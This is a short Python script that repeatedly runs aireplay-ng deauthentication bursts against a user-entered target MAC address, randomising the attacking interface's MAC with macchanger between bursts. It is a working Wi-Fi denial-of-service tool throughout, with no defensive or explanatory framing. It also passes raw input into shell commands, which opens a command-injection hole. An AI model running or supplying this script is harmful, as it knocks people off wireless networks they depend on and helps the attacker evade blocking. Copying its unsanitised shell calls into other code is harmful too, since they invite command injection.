 import subprocess
import optparse
import re
i = 1
mac = input("atack MAC: ")
sleep = input("sleep time: ")
while True:
    if i == 1:
        subprocess.call("aireplay-ng -0 5 -a "+ mac +" wlan0", shell=True)
        subprocess.call("ifconfig wlan0 down", shell=True)
        subprocess.call("macchanger -r wlan0 | 'New MAC'", shell=True)
        subprocess.call("iwconfig wlan0 mode monitor", shell=True)
        subprocess.call("ifconfig wlan0 up", shell=True)
        subprocess.call("iwconfig wlan0 | grep Mode", shell=True)
        subprocess.call("sleep "+ sleep, shell=True)
        subprocess.call("echo Waiting!!!!!", shell=True)
    if i == 0:
        break
    
    
